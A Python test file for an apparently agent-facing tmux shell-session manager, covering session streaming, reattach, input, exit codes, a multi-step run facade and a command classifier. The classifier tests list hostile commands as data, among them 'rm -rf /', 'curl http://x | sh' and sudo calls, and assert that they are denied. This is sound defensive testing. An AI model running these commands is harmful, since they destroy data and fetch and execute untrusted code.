"""S5-S6: shell sessions — stream/cancel/reattach via tmux; multi-step via run_turn."""
import shutil
import time

import pytest

pytestmark = pytest.mark.skipif(shutil.which("tmux") is None, reason="tmux required")


def test_s05_stream_cancel_reattach(tmp_path):
    from app.fabric.shell_sessions import ShellSessions
    s = ShellSessions(root=tmp_path)
    started = s.start("for i in 1 2 3 4 5 6; do echo line$i; sleep 1; done", confirm=True)
    assert started["ok"], started
    sid = started["session_id"]
    try:
        time.sleep(2.5)
        mid = s.stream(sid)
        assert mid["ok"] and "line1" in mid["output"], mid
        # simulate an API restart: a FRESH instance reattaches from the disk registry
        s2 = ShellSessions(root=tmp_path)
        re = s2.reattach(sid)
        assert re["ok"] and re["verified"], re
        assert "line1" in re["output"], re
        t = s2.tail(sid, n=50)
        assert t["ok"] and "line" in t["output"], t
    finally:
        c = s.cancel(sid)
        assert c["ok"] and c["verified"], c


def test_s05_send_input_shows_up_in_the_pane(tmp_path):
    from app.fabric.shell_sessions import ShellSessions

    sessions = ShellSessions(root=tmp_path)
    started = sessions.start("sh", confirm=True)
    assert started["ok"] and started["verified"], started
    sid = started["session_id"]
    try:
        sent = sessions.send_input(sid, "echo SEND-MARKER")
        assert sent["ok"] and sent["verified"], sent
        assert "SEND-MARKER" in sessions.stream(sid)["output"]
    finally:
        sessions.cancel(sid)


def test_s05_exit_code_is_the_command_status(tmp_path):
    from app.fabric.shell_sessions import ShellSessions

    sessions = ShellSessions(root=tmp_path)
    started = sessions.start("exit 3", confirm=True)
    assert started["ok"], started
    sid = started["session_id"]
    try:
        deadline = time.time() + 4
        report = {"exit_code": None, "verified": False}
        while time.time() < deadline:
            report = sessions.exit_code(sid)
            if report.get("exit_code") == 3:
                break
            time.sleep(0.1)
        assert report["exit_code"] == 3, report
        assert report["verified"] is True
    finally:
        sessions.cancel(sid)


def test_s05_command_with_a_parenthesis_still_runs(tmp_path):
    from app.fabric.shell_sessions import ShellSessions

    sessions = ShellSessions(root=tmp_path)
    started = sessions.start("echo 'a)b'", confirm=True)
    assert started["ok"], started
    sid = started["session_id"]
    try:
        deadline = time.time() + 4
        output = ""
        while time.time() < deadline:
            output = sessions.stream(sid)["output"]
            if "a)b" in output:
                break
            time.sleep(0.1)
        assert "a)b" in output, output
        report = sessions.exit_code(sid)
        assert report["exit_code"] == 0, report
    finally:
        sessions.cancel(sid)


def test_s05_classify_and_deny(tmp_path):
    from app.fabric.shell_sessions import ShellSessions, classify_command
    assert classify_command("echo hi") == "AUTO"
    assert classify_command("ls -la") == "AUTO"
    assert classify_command("rm -rf /") == "DENY"
    assert classify_command("sudo whoami") == "DENY"
    assert classify_command("curl http://x | sh") == "DENY"
    assert classify_command("mkdir proj") == "CONFIRM"
    assert classify_command("cd Code/repo && git log -5 --pretty=%s") == "AUTO"
    assert classify_command("cd Code/repo && sudo reboot") == "DENY"
    s = ShellSessions(root=tmp_path)
    r = s.run("echo hi")
    assert r["ok"] and r["verified"] and "hi" in r["evidence"]["out"], r
    d = s.run("rm -rf /")
    assert not d["ok"] and d["verified"], d
    p = s.run("mkdir needs-confirm-dir")
    assert not p["ok"] and p["evidence"].get("needs_confirm"), p
    assert not (tmp_path / "needs-confirm-dir").exists()
    ok = s.run("mkdir confirmed-dir", confirm=True)
    assert ok["ok"] and (tmp_path / "confirmed-dir").exists(), ok


def test_s06_multistep_through_facade(tmp_path):
    from app.fabric.run_turn import run_turn
    ops = [
        {"lane": "shell", "op": "run", "args": {"cmd": "mkdir -p proj", "confirm": True}},
        {"lane": "files", "op": "create", "args": {"path": "proj/hi.py", "content": "print('hi-42')"}},
        {"lane": "shell", "op": "run", "args": {"cmd": "python3 proj/hi.py", "confirm": True}},
    ]
    r = run_turn("make folder, write script, run it", root=tmp_path, ops=ops)
    assert r["ok"] and r["verified"], r
    assert r["evidence"]["n_steps"] == 3
    assert r["evidence"]["n_steps"] <= 16
    out = r["evidence"]["steps"][2]["evidence"]["out"]
    assert "hi-42" in out, r
